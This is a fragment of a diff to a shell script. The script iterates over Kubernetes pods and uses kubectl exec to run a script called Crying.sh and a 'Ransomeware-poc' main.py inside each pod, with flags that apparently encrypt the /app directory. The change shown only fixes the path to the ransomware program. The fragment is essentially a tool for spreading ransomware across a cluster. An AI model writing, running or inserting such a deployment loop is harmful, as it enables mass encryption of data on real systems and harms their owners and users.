@@ -36,7 +36,7 @@ for IP in $POD_IPS; do
             echo "Failed to execute Crying.sh in pod: $POD_NAME"
             continue
         }
-        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/Ransomeware-poc/main.py && python3 /app/Crying/Ransomeware-poc/main.py -p /app -e" || {
+        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Ransomeware-poc/main.py && python3 /app/Ransomeware-poc/main.py -p /app -e" || {
             echo "Failed to execute main.py in pod: $POD_NAME"
         }
         echo "Scripts executed successfully in pod: $POD_NAME"
